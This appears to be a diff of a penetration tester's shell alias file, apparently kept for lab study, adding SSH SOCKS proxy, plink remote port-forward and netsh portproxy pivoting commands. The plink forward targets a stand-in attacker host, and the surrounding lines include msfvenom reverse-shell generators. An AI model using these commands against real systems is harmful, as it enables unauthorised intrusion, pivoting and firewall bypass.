@@ -360,6 +360,7 @@ alias gen-wordlist="cewl -m 6 -w cewl-wordlist.txt $URL"
 
 alias ssh-local-portfwd="ssh -N -L $LHOST:$LPORT:$RHOST:$RPORT $SUSER@$SPROXY"
 alias ssh-remote-portfwd="ssh -N -R $LHOST:$LPORT:$RHOST:$RPORT $SUSER@$LHOST"
+alias ssh-socks4proxy="ssh -N -D $LHOST:$LPORT $SUSER@$SPROXY"
 
 # other tools
 alias gcc-winpe='i686-w64-mingw32-gcc '
@@ -384,7 +385,6 @@ alias venom_jsp="msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LHOST LPORT=$LPOR
 alias venom_php="msfvenom -p php/reverse_php LHOST=$LHOST LPORT=$LPORT -f raw > shell.php"
 alias venom_war="msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f war > shell.war"
 #todo: smb-map
-
 
 #todo: impacket
 alias impacket-launchsmbserver='python smbserver.py NOPEROPE /offsec/stage'
@@ -443,7 +443,23 @@ echo `-- localhost:3306 <-- 4444:kali
 echo ssh -N -R kali:4444:sql:3306 kali@kali
 echo `-- sql:3306 <-- Ephemeral:localhost:22 <-- 4444:kali
 '
+alias usage-plink-remote-portfwd='
+echo cmd.exe /c echo y | plink.exe -ssh -l <user> -pw <pass> -R <bind_addr>:<bind_port>:<target_addr>:<target_port> <proxy>
+echo cmd.exe /c echo y | plink.exe -ssh -l offsec -pw offsec -R kali.evil:1337:127.0.0.1:3306 kali.evil
+echo `-- localhost:3306 <-- 1337:kali
+'
 
+alias usage-netsh-forward='
+echo # 1. Create proxy
+echo netsh interface portproxy add v4tov4 listenport=<local_port> listenaddress=<local_addr> connectport=<remote_port> connectaddress=<remote_addr>
+echo netsh interface portproxy add v4tov4 listenport=4455 listenaddress=10.11.0.22 connectport=445 connectaddress=192.168.1.110
+echo 
+echo # 2. Create firewall rule
+echo netsh advfirewall firewall add rule name="<name>" protocol=<proto> dir=<in|out> localip=<local_addr> localport=<local_port> action=allow
+echo netsh advfirewall firewall add rule name="forward_port_rule" protocol=TCP dir=in localip=10.11.0.22 localport=4455 action=allow
+echo 
+echo `-- kali:445 --> 4455:10.11.0.22:: --> 445:192.168.1.110
+'
 
 ### logstash ###
 ### zeek ###
